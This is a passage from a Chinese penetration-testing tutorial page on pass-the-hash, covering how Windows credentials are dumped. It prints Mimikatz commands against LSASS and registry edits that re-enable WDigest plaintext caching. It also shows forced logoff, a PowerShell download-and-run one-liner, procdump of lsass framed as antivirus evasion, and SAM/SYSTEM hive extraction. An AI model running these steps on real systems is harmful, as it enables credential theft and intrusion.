<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">mimikatz#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> !processprotect</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /process:lsass.exe</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /remove</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">mimikatz#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> sekurlsa::logonpasswords</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></blockquote><h4 id="禁止wdigest-auth缓存明文密码" tabindex="-1"><a class="header-anchor" href="#禁止wdigest-auth缓存明文密码"><span>禁止Wdigest Auth缓存明文密码</span></a></h4><p>Microsoft发布了一个补丁<a href="https://blogs.technet.microsoft.com/srd/2014/06/05/an-overview-of-kb2871997/" target="_blank" rel="noopener noreferrer">KB2871997</a>，安装此补丁后，允许用户在注册表中配置一个设置（高版本已默认配置）禁用 WDigest 身份验证，从而防止将明文密码存储在内存中。此时mimikatz用抓取时密码字段会显示为null</p><blockquote><p>开启Wdigest Auth</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#cmd</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">reg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> HKLM</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\S</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">YSTEM</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\C</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">urrentControlSet</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\C</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ontrol</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\S</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ecurityProviders</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\W</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">Digest</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> UseLogonCredential</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> REG_DWORD</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /d</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /f</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#powershell</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Set-ItemProperty</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -Path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> HKLM:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\S</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">YSTEM</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\C</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">urrentControlSet</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\C</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ontrol</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\S</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ecurityProviders</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\W</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">Digest</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -Name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> UseLogonCredential</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -Type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> DWORD</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -Value</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#meterpreter</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">reg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> setval</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -k</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> HKLM</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">SYSTEM</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">CurrentControlSet</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">Control</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">SecurityProviders</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">WDigest</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> UseLogonCredential</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> REG_DWORD</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -d</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></blockquote><blockquote><p>关闭Wdigest Auth</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#cmd</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">reg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> HKLM</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\S</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">YSTEM</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\C</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">urrentControlSet</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\C</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ontrol</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\S</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ecurityProviders</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\W</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">Digest</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> UseLogonCredential</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> REG_DWORD</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /d</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /f</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#powerhsell</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Set-ItemProperty</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -Path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> HKLM:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\S</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">YSTEM</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\C</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">urrentControlSet</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\C</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ontrol</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\S</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ecurityProviders</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\W</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">Digest</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -Name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> UseLogonCredential</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -Type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> DWORD</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -Value</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#meterpreter</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">reg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> setval</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -k</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> HKLM</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">SYSTEM</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">CurrentControlSet</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">Control</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">SecurityProviders</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">WDigest</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> UseLogonCredential</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> REG_DWORD</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -d</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#mimikatz</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sekurlsa::wdigest</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></blockquote><p><strong>绕过方法：手动开启Wdigest Auth，强制锁屏或注销，让管理用重新登录，把明文密码储存在内存中</strong></p><ul><li><p>强制锁屏/注销(一般都需要注销)</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#cmd</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">rundll32</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> user32.dll,LockWorkStation</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#powershell</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">powershell</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -c</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/kiraly15/Lock-WorkStation/master/Lock-WorkStation.ps1&#39;);&quot;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#cmd注销当前用户</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">1.logoff</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">2.shutdown.exe</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /l</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /f</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> 		#静默注销，但是需要管理员权限</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li></ul><p>等待管理员用户重新登录，再进行常规的密码抓取，就能够抓到明文密码了</p><h4 id="mimikatz离线抓取" tabindex="-1"><a class="header-anchor" href="#mimikatz离线抓取"><span>Mimikatz离线抓取</span></a></h4><p>算是一些小方法，用来绕过杀软或是检查的</p><ul><li><p>通过procdump上去将lsass.exe进程dump下来抓取</p><p>并且由于这个工具具有微软官方的签名，可以很好的绕过杀软</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">procdump64.exe</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -accepteula</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -ma</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> lsass.exe</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> lsass.dmp</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#-ma写入完整的转储文件</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#-accepteula自动接受用户许可协议(静默)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>将保存的转储文件保存到mimikatz.exe同一目录下</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">mimikatz.exe</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">privilege::debug</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sekurlsa::minidump</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> lsass.dmp</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sekurlsa::logonpasswords</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> full</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>成功离线抓取密码</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/mimikatzdumpproc.png" alt="mimikatzdumpproc" tabindex="0" loading="lazy"><figcaption>mimikatzdumpproc</figcaption></figure></li><li><p>离线读取SAM数据库</p><p>通过导出sam和system注册表来达成目的</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#导出注册表</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">reg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> save</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> HKLM</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\S</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">YSTEM</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> SystemBkup.hiv</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">reg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> save</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> HKLM</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\S</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">AM</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> SamBkup.hiv</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>复制文件</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">C:\\Windows\\System32\\config\\SYSTEM</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">C:\\Windows\\System32\\config\\SAM</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>这些文件默认无法被复制，可以通过NinjaCopy等脚本进行导出，导出后可以在其他系统上进行加载，这里我将文件下载到主系统上进行导出，执行以下命令</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">privilege::debug</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">lsadump::sam</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /sam:SamBkup.hiv</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /system:SystemBkup.hiv</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/dumphiv.png" alt="dumphiv" tabindex="0" loading="lazy"><figcaption>dumphiv</figcaption></figure></li></ul><p>关于SAM导出的原理分析：<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87SAM%E6%95%B0%E6%8D%AE%E5%BA%93%E8%8E%B7%E5%BE%97%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7hash" target="_blank" rel="noopener noreferrer">https://3gstudent.github.io/渗透技巧-通过SAM数据库获得本地用户hash</a></p><h2 id="参考链接" tabindex="-1"><a class="header-anchor" href="#参考链接"><span>参考链接：</span></a></h2><p><a href="https://xz.aliyun.com/t/8601" target="_blank" rel="noopener noreferrer">https://xz.aliyun.com/t/8601</a></p><p><a href="https://msrc.microsoft.com/blog/2014/06/an-overview-of-kb2871997/" target="_blank" rel="noopener noreferrer">https://msrc.microsoft.com/blog/2014/06/an-overview-of-kb2871997/</a></p><p><a href="https://ssooking.github.io/2020/07/mimikatz%E6%8A%93%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81/" target="_blank" rel="noopener noreferrer">https://ssooking.github.io/2020/07/mimikatz抓取明文密码/</a></p>`,92)]))}const r=s(n,[["render",h],["__file","哈希传递攻击(PTH).html.vue"]]),d=JSON.parse('{"path":"/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE/%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB(PTH).html","title":"PasstheHash","lang":"zh-CN","frontmatter":{"description":"PasstheHash 之前在做内网横线移动基础时，简单介绍了一下利用Pass the hash手法来实现横向移动，这里打算详细看看 基础知识 先来看看哈希传递·，传递的是什么hash LM Hash LM(LAN Mannager) 协议使用的hash就叫做 LM Hash, 由IBM设计和提出, 在过去早期使用。 由于其存在比较多的缺点，比较容易破...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/articles/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE/%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB(PTH).html"}],["meta",{"property":"og:site_name","content":"uu2fu3o的知识库"}],["meta",{"property":"og:title","content":"PasstheHash"}],["meta",{"property":"og:description","content":"PasstheHash 之前在做内网横线移动基础时，简单介绍了一下利用Pass the hash手法来实现横向移动，这里打算详细看看 基础知识 先来看看哈希传递·，传递的是什么hash LM Hash LM(LAN Mannager) 协议使用的hash就叫做 LM Hash, 由IBM设计和提出, 在过去早期使用。 由于其存在比较多的缺点，比较容易破..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/hashcalc.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-15T18:41:02.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-15T18:41:02.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"PasstheHash\\",\\"image\\":[\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/hashcalc.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/sekurlsamsv.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/sekurlsalogon.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/samlocal.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/dcsyncdump.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/mimikatzdumpproc.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/dumphiv.png\\"],\\"dateModified\\":\\"2025-01-15T18:41:02.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"uu2fu3o\\",\\"url\\":\\"https://mister-hope.com\\"}]}"]]},"headers":[{"level":2,"title":"基础知识","slug":"基础知识","link":"#基础知识","children":[{"level":3,"title":"LM Hash","slug":"lm-hash","link":"#lm-hash","children":[]},{"level":3,"title":"NTLM Hash","slug":"ntlm-hash","link":"#ntlm-hash","children":[]}]},{"level":2,"title":"PTH攻击","slug":"pth攻击","link":"#pth攻击","children":[{"level":3,"title":"mimikatz直接抓取hash进行传递","slug":"mimikatz直接抓取hash进行传递","link":"#mimikatz直接抓取hash进行传递","children":[]},{"level":3,"title":"无法直接抓取的情况","slug":"无法直接抓取的情况","link":"#无法直接抓取的情况","children":[]}]},{"level":2,"title":"参考链接：","slug":"参考链接","link":"#参考链接","children":[]}],"git":{"createdTime":1736966462000,"updatedTime":1736966462000,"contributors":[{"name":"uu2fu3o","username":"uu2fu3o","email":"1027578439@qq.com","commits":1,"url":"https://github.com/uu2fu3o"}]},"readingTime":{"minutes":9.32,"words":2795},"filePathRelative":"渗透测试/内网体系建设/哈希传递攻击(PTH).md","localizedDate":"2025年1月16日","excerpt":"\\n<p>之前在做内网横线移动基础时，简单介绍了一下利用Pass the hash手法来实现横向移动，这里打算详细看看</p>\\n<h2>基础知识</h2>\\n<p>先来看看哈希传递·，传递的是什么hash</p>\\n<h3>LM Hash</h3>\\n<p>LM(LAN Mannager) 协议使用的hash就叫做 LM Hash, 由IBM设计和提出, 在过去早期使用。</p>\\n<p>由于其存在比较多的缺点，比较容易破解。</p>\\n<p><strong>自WindowsVista和Windows Server 2008开始,Windows取消LM hash。</strong></p>\\n<h4>LM hash的生成规则</h4>","autoDesc":true}');export{r as comp,d as data};
